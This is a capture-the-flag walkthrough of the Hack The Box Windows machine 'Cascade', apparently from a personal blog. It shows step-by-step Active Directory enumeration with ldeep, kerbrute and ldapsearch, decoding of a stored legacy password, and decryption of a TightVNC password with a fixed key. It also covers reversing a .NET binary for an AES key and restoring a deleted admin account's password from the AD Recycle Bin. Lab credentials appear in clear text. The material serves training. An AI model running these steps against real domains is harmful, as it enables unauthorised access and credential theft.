---
title: "HTB - Cascade"
date: 2023-03-16
draft: false
tags: [HTB, Medium, Windows]
---

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-16 17:02:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-16T17:03:44
|_  start_date: 2023-03-16T15:59:37
```
Classic windows box with ldap and smb2 server.

Using `ldeep` we enumerate users on the domain 
```
~/HTB/Cascade
❯ ldeep ldap -a -d cascade.local -s ldap://10.10.10.182 users all                                             
['i.croft']
['j.allen']
['BackupSvc']
['d.burman']
['b.hanson']
['e.crowe']
['a.turnbull']
['j.goodhand']
['s.hickson']
['j.wakefield']
['util']
['r.thompson']
['s.smith']
['arksvc']
['CascGuest']
```

Since Kerberos is enabled on the domain, we can try to check if the users we got in LDAP matches any users in the AD. To do that, we'll use `kerbrute`
```
~/HTB/Cascade
❯ /home/kali/kerbrute_linux_amd64 userenum --dc 10.10.10.182 --domain cascade.local ldap_users 

   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/16/23 - Ronnie Flathers @ropnop

2023/03/16 13:19:56 >  Using KDC(s):
2023/03/16 13:19:56 >  	10.10.10.182:88

2023/03/16 13:20:01 >  [+] VALID USERNAME:	 d.burman@cascade.local
2023/03/16 13:20:01 >  [+] VALID USERNAME:	 j.wakefield@cascade.local
2023/03/16 13:20:01 >  [+] VALID USERNAME:	 BackupSvc@cascade.local
2023/03/16 13:20:01 >  [+] VALID USERNAME:	 a.turnbull@cascade.local
2023/03/16 13:20:01 >  [+] VALID USERNAME:	 j.goodhand@cascade.local
2023/03/16 13:20:01 >  [+] VALID USERNAME:	 s.hickson@cascade.local
2023/03/16 13:20:01 >  [+] VALID USERNAME:	 j.allen@cascade.local
2023/03/16 13:20:06 >  [+] VALID USERNAME:	 util@cascade.local
2023/03/16 13:20:06 >  [+] VALID USERNAME:	 arksvc@cascade.local
2023/03/16 13:20:06 >  [+] VALID USERNAME:	 s.smith@cascade.local
2023/03/16 13:20:06 >  [+] VALID USERNAME:	 r.thompson@cascade.local
```
 
Looking for more infos in the user inside LDAP
```
~/HTB/Cascade
❯ ldapsearch -x -H ldap://10.10.10.182 -b 'DC=cascade,DC=local' -s sub '(objectclass=user)'
...
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
...
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
...
cascadeLegacyPwd: clk0bjVldmE=
...
```

An additional attribute was added to the Ryan Thompson user data inside the LDAP server, upon decoding the `cascadeLegacyPwd` we find the password of r.thompson. We can confirm that by trying to use it wit crackmapexec
```
~/HTB/Cascade
❯ cme smb cascade.local -u r.thompson -p 'rY4n5eva' --shares
SMB         cascade.local   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         cascade.local   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         cascade.local   445    CASC-DC1         [+] Enumerated shares
SMB         cascade.local   445    CASC-DC1         Share           Permissions     Remark
SMB         cascade.local   445    CASC-DC1         -----           -----------     ------
SMB         cascade.local   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         cascade.local   445    CASC-DC1         Audit$                          
SMB         cascade.local   445    CASC-DC1         C$                              Default share
SMB         cascade.local   445    CASC-DC1         Data            READ            
SMB         cascade.local   445    CASC-DC1         IPC$                            Remote IPC
SMB         cascade.local   445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         cascade.local   445    CASC-DC1         print$          READ            Printer Drivers
SMB         cascade.local   445    CASC-DC1         SYSVOL          READ            Logon server share
```

We'll leave aside the `Audit$` share and focus on the `Data` one first.
```
.
├── Email Archives
│   └── Meeting_Notes_June_2018.html
├── LogonAudit
├── Logs
│   ├── Ark AD Recycle Bin
│   │   └── ArkAdRecycleBin.log
│   └── DCs
│       └── dcdiag.log
└── Temp
    ├── r.thompson
    └── s.smith
        └── VNC Install.reg
```

There is multiple information's that we can deduce from this data :)
1. We have an encrypted version of the `s.smith` password
2. Inside the `Meeting_Notes_June_2018.html` file we discover that there is a temp admin that have the same credential as the real admin
3. The `ArkAdRecycleBin.log` tells us that  the TempAdmin was deleted and put in the AD Recycle Bin

## Getting `s.smith` password
Inside the `Temp/s.smith` directory we discover a registry file that looks like a `TightVNC` server configuration. Inside we find a key named password in an hexadecimal format
```
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
```

Using this following [resource](https://github.com/billchaison/VNCDecrypt) we can successfully decode the password
```
❯ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv                                                                                              14:53:39
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

This give us `s.smith` with which we can logon to the machine using evil-winrm and access the user flag.

`s.smith` have access to the `Audit$` share which contains some windows binaries as well as an `Audit.db`.

Using `smbclient`, we can retrieve all the files located inside the share
```
❯ smbclient \\\\10.10.10.182\\Audit\$ -Tc audit_allfiles.tar / -U CASCADE.LOCAL/s.smith
...
❯ tree
.
├── audit_allfiles.tar
├── CascAudit.exe
├── CascCrypto.dll
├── DB
│   └── Audit.db
├── RunAudit.bat
├── x64
│   └── SQLite.Interop.dll
└── x86
    └── SQLite.Interop.dll
```

Inside the Audit db we find a base64 encoded password that belongs to `ArkSvc`.

`ArkSvc` belongs to the `AD Recycle Bin` group, this mean that if we are able to become this user we'll  be able to retrieve the password of `TempAdmin` which would be the `Administrator` password
```
*Evil-WinRM* PS C:\Users\s.smith\Documents> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
...
Local Group Memberships      *AD Recycle Bin       *IT       *Remote Management Use
Global Group memberships     *Domain Users
```

## Decompiling `CascAudit.exe` 

Using ILSpy and Avalonia we can decompile the executable and find that the base64 password that we found is actually AES encrypted and that the IV and the Key  to encrypt the password are in plain text.

We can use them to decrypt `ArkSvc`s password and login as `ArkSvc` with evil-winrm

![](HTB/Medium/Cascade/Pasted%20image%2020230316233054.png)

Judging from the [Hacktricks section](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#ad-recycle-bin) about the `AD Recycle Bin` group we can list all AD object that were deleted, thus allowing us to retrieve the `TempAdmin` object
```
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and sAMAccountName -eq "TempAdmin"' -includeDeletedObjects -Properties *
...
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
...
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

Using the password inside `cascadeLegacyPwd` attribute, we can login as the Administrator and get the root password

## Videos references
### IppSec
{{< youtube mr-fsVLoQGw >}}